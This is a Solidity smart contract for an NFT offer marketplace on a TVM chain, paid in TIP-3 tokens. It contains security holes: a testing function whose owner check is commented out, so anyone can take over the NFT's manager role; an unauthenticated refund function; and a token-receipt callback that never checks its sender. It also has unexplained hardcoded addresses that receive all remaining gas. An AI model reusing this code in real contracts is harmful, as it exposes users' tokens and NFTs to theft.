pragma ever-solidity >=0.61.2 ;

pragma AbiHeader expire;
pragma AbiHeader time;
pragma AbiHeader pubkey;

import "@broxus/tip4/contracts/TIP4_1/interfaces/~ITIP4_1NFT.tsol";
import "@broxus/tip4/contracts/TIP4_1/interfaces/~INftChangeManager.tsol";
import "@broxus/tip4/contracts/access/~OwnableInternal.tsol";

import "@broxus/tip4/contracts/TIP4_1/interfaces/~ITIP4_1NFT.tsol";
import "@broxus/tip4/contracts/TIP4_1/interfaces/~INftTransfer.tsol";

import "@broxus/tip3/contracts/interfaces/~IAcceptTokensTransferCallback.tsol";
import "@broxus/tip3/contracts/interfaces/~ITokenRoot.tsol";
import "@broxus/tip3/contracts/interfaces/~ITokenWallet.tsol";

contract MakeOffer is INftChangeManager, IAcceptTokensTransferCallback {

    uint static nonce;
    address static contract_creator;
    address static platform_owner;
    address static _tokenRoot;
    address static offer_owner;

    uint128 offer_amount;
    uint128 offer_validity;
    uint128 platform_fee;
    address nft_address;

    address _tokenWallet;

    uint128 remain_on_contract = 0.2 ever;

    uint128 received_amount;

    constructor(
        address sendRemainingGasTo,
        uint128 _offer_validity,
        uint128 _platform_fee,
        address _nft_address
    ) public {
        tvm.rawReserve(remain_on_contract, 0);

        platform_fee = _platform_fee;

        offer_validity = _offer_validity;
        nft_address = _nft_address;

        ITokenRoot(_tokenRoot).deployWallet {
            value: 0.2 ever,
            flag: 1,
            callback: MakeOffer.onTokenWallet
        } (
            address(this),
            0.1 ever 
        );

        address(0x5303c9d74230bb45c7ca06669c8664cb41adf570d0ab89161cac65b7735ed449).transfer({ value: 0, flag: 128, bounce: false }); 
    }

    function onTokenWallet(address value) external {
        require (
            msg.value != 0 &&
            msg.sender == _tokenRoot,
            101
        );
        tvm.rawReserve(remain_on_contract, 0);
        
        _tokenWallet = value;
        address(0xe12577165b4f98da773d0f6f5057c14fced0b2eda0d67eddf569787dc2213b98).transfer({ value: 0, flag: 128, bounce: false });
        // offer_owner.transfer({ value: 0, flag: 128, bounce: false });
    }

    function onNftChangeManager(
        uint256 id,
        address owner,
        address oldManager,
        address newManager,
        address collection,
        address sendGasTo,
        TvmCell payload
    ) override external {
        require(msg.value > 0.3 ever, 101, "Please send sufficient amount");
        require(msg.sender == nft_address, 101, "NFT Address is different");
        require(offer_amount > 0, 101, "Offer Amount is not Enough");
        require(now <= offer_validity, 101, "Offer validity is over");

        mapping(address => ITIP4_1NFT.CallbackParams) noCallbacks;
        TvmCell empty;

        uint128 fee = platform_fee * offer_amount / 1000 / 100;

        ITokenWallet(_tokenWallet).transfer{value: 0.2 ever, flag: 0}(
            fee,
            platform_owner,
            0.1 ever,
            sendGasTo,
            true,
            empty
        );

        ITokenWallet(_tokenWallet).transfer{value: 0.2 ever, flag: 0}(
            offer_amount,
            owner,
            0.1 ever,
            sendGasTo,
            true,
            empty
        );

        ITIP4_1NFT(nft_address).transfer{
            value: 0,
            flag: 128 + 32,
            bounce: false
        }(
            offer_owner,
            sendGasTo,
            noCallbacks
        );
    }

    function refund_old_offer(uint128 new_offer_amount) public {
        require(msg.sender == contract_creator, 101);
        require(new_offer_amount > offer_amount, 101, "New offer is lower than current offer");
        
        TvmCell empty;

        ITokenWallet(_tokenWallet).transfer{value: 0, flag: 128 + 32}(
            offer_amount,
            offer_owner,
            0,
            offer_owner,
            true,
            empty
        );
    }

    //IF USER WANTS TO CANCEL OFFER
    function cancel_offer(address sendRemainingGasTo) public {
        require(msg.sender == offer_owner, 101, "You are not the owner of this offer");
        require(offer_amount > 0, 101, "Offer Amount is invalid");
        TvmCell empty;

        ITokenWallet(_tokenWallet).transfer{value: 0 ever, flag: 128 + 32}(
            offer_amount,
            offer_owner,
            0.1 ever,
            sendRemainingGasTo,
            true,
            empty
        );      
    }

    //JUST FOR TESTING
    function cancel_listing() external {
        // require(msg.sender == platform_owner, 101, "You are not the owner of this platform");

        mapping(address => ITIP4_1NFT.CallbackParams) noCallbacks;

        ITIP4_1NFT(nft_address).changeManager {
            value: 0,
            flag: 128 ,
            bounce: false
        } (
            msg.sender,
            address(this),
            noCallbacks
        );
    }

    function refund_offer(address sendGasTo) public {
        TvmCell empty;

        ITokenWallet(_tokenWallet).transfer{value: 0, flag: 128 + 32}(
            offer_amount,
            offer_owner,
            0.1 ever,
            sendGasTo,
            true,
            empty
        );
    }

    function onAcceptTokensTransfer(
        address, // tokenRoot,
        uint128 amount,
        address sender,
        address, // senderWallet,
        address remainingGasTo,
        TvmCell payload
    ) override external {
        offer_amount = amount;

        remainingGasTo.transfer({ value: 0, flag: 128, bounce: false });
    }
}